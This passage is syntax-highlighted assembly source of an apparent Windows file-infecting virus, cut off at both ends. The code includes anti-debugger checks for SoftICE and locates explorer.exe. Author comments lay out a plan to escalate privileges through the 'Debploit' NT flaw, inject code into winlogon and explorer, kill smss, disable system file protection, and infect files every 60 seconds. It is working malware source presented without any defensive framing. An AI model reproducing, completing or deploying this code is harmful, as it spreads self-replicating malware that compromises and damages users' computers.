</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Module32NextCRC</span><span class="sc4">,</span><span class="sc5">M32NNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; Module32Next</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;we save it</span><span class="sc0">
</span><span class="sc5">NextModule</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;esp + 32 + 256 -&gt; name of module with path(becoz GetModuleFileName gives entire path)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc1">;eax = CRC of name of module we have got</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc1">;eax = CRC of our module</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundModule</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SNAPSHOT</span><span class="sc4">]</span><span class="sc1">;we recover snapshot</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax -&gt; Module32Next</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextModule</span><span class="sc0">
</span><span class="sc5">FoundModule</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;yeah!!!! ;)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc4">]</span><span class="sc1">;base kernel</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SNAPSHOT</span><span class="sc4">]</span><span class="sc1">;we recover snapshot</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;snapshot closed</span><span class="sc0">
</span><span class="sc1">;now we recover information for returning parameters and ret ;)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;GetExplorer</span><span class="sc0">
</span><span class="sc1">;In:</span><span class="sc0">
</span><span class="sc1">;   eax = base of kernel</span><span class="sc0">
</span><span class="sc1">;   esi -&gt; buffer for storing name</span><span class="sc0">
</span><span class="sc1">;Out:</span><span class="sc0">
</span><span class="sc1">;   esi -&gt;buffer  </span><span class="sc0">
</span><span class="sc1">;   ecx = bytes of name</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">GetExplorer</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetWindowsDirectoryACRC</span><span class="sc4">,</span><span class="sc5">GWDNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; GetWindowsDir</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">200</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'LPXE'</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'RERO'</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;DetectSICE try to detect softice,and in the case softice was detected,then stop execution.</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   eax = kernel base</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">DetectSICE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;check sice in 9x</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c0000000h</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SICE9X</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateFileACRC</span><span class="sc4">,</span><span class="sc5">CFNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoSICE9X</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">NoSICE9X</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SICENT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateFileACRC</span><span class="sc4">,</span><span class="sc5">CFNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoSICENT</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">NoSICENT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SICE9X</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\\.\SICE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SICENT</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\\.\NTICE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;NT ZONE !¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!</span><span class="sc0">
</span><span class="sc1">;NT ZONE !¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!</span><span class="sc0">
</span><span class="sc1">;NT ZONE !¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!</span><span class="sc0">
</span><span class="sc1">;NT ZONE !¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!</span><span class="sc0">
</span><span class="sc1">;NT ZONE !¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!¡!</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;Well...now we are in NT.We will fight agresively against NT for</span><span class="sc0">
</span><span class="sc1">;getting full privileges ;/ Virus its very different if we are</span><span class="sc0">
</span><span class="sc1">;in NT.Here we dont load and dont inject code to explorer.exe.</span><span class="sc0">
</span><span class="sc1">;Here we will try to get full privileges with some methods </span><span class="sc0">
</span><span class="sc1">;and later we will infect files.</span><span class="sc0">


</span><span class="sc1">;NT part works in this manner: i try to get anough privileges to open winlogon and</span><span class="sc0">
</span><span class="sc1">;inject code there(with i WannaCanDebug).If i dont get anough,i use a second method.</span><span class="sc0">
</span><span class="sc1">;I use a flaw in NT.I havent discovered that flaw.I speaking about Debploit method.</span><span class="sc0">
</span><span class="sc1">;You can search about this in www.securiteam.com in NT focus.With this,i connect to</span><span class="sc0">
</span><span class="sc1">;dbgss and i say it that it gives me a duplicate handle to winlogon,however,it will</span><span class="sc0">
</span><span class="sc1">;give me it with full privileges :D ... There is a problem with this...If i say </span><span class="sc0">
</span><span class="sc1">;dbgss i am the debugger of winlogon,and winlogon is my debugee process(i attach</span><span class="sc0">
</span><span class="sc1">;it) when my process terminated,winlogon will finish too and system will reboot.</span><span class="sc0">
</span><span class="sc1">;For this reason,when i infect winlogon,since winlogon injected code,i kill smss</span><span class="sc0">
</span><span class="sc1">;(where is implemented dbgss) and smss will not kill winlogon.In this manner,only first</span><span class="sc0">
</span><span class="sc1">;infected file executed will inject code in winlogon becoz when second infected program</span><span class="sc0">
</span><span class="sc1">;was executed,it will not find dbgss.</span><span class="sc0">
</span><span class="sc1">;In winlogon,virus disable sfp with Ratter and Benny method(29a number 6).Later,it </span><span class="sc0">
</span><span class="sc1">;gets a handle to explorer and inject code there,and create a remote thread in </span><span class="sc0">
</span><span class="sc1">;explorer:There,ExplorerCode is executed.This code will infect current folder of</span><span class="sc0">
</span><span class="sc1">;explorer.exe each 60 seconds.</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;NTInvasion try to KILL NT ;O</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   eax = kernel base</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">NTInvasion</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ContinueNT</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ContinueNT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">GetLibrarys</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">DebuggerTrickz</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">FreeLibrarys</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">NtKernel</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NtAdvapi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NtPsapi</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NtRasapi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Ntdll</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">GetLibrarys</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc1">;first,ill try to get ntdll base from PEB structure</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;PEB pointer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;PEB_LDR_DATA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;LIST_ENTRY</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ntdll.dll base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Ntdll</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LoadLibraryACRC</span><span class="sc4">,</span><span class="sc5">LLNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">advapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtAdvapi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">psapi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
